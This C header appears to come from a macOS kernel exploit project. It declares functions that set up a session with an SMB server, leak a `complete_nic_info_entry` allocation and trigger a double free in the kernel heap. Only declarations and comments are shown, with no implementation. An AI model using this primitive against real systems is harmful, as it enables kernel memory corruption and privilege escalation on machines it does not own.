//
//  zfree_kext.h
//  kmem_xepg
//
//  Created by admin on 12/20/21.
//

#ifndef zfree_kext_h
#define zfree_kext_h

#include <stdio.h>

#include <smbfs/smb2_mc.h>

typedef struct xe_kheap_free_session* xe_kheap_free_session_t;

/// Create a new double free session
/// @param smb_addr socket address of xe_smbx server
xe_kheap_free_session_t xe_kheap_free_session_create(const struct sockaddr_in* smb_addr);

/// Allocate and leak a `struct complete_nic_info_entry` which can be used for double free
/// @param session `xe_kheap_free_session_t` created using `xe_kheap_free_session_create`
struct complete_nic_info_entry xe_kheap_free_session_prepare(xe_kheap_free_session_t session);

/// Trigger the double free of NIC with index `entry->nic_index`
/// @param session `xe_kheap_free_session_t` created using `xe_kheap_free_session_create`
/// @param entry Replacement data for the `struct complete_nic_info_entry` leaked by
///             `xe_kheap_free_session_prepare`
void xe_kheap_free_session_execute(xe_kheap_free_session_t session, const struct complete_nic_info_entry* entry);

/// Release resources
/// @param session_p  Pointer to`xe_kheap_free_session_t` created using `xe_kheap_free_session_create`
void xe_kheap_free_session_destroy(xe_kheap_free_session_t* session_p);

#endif /* zfree_kext_h */
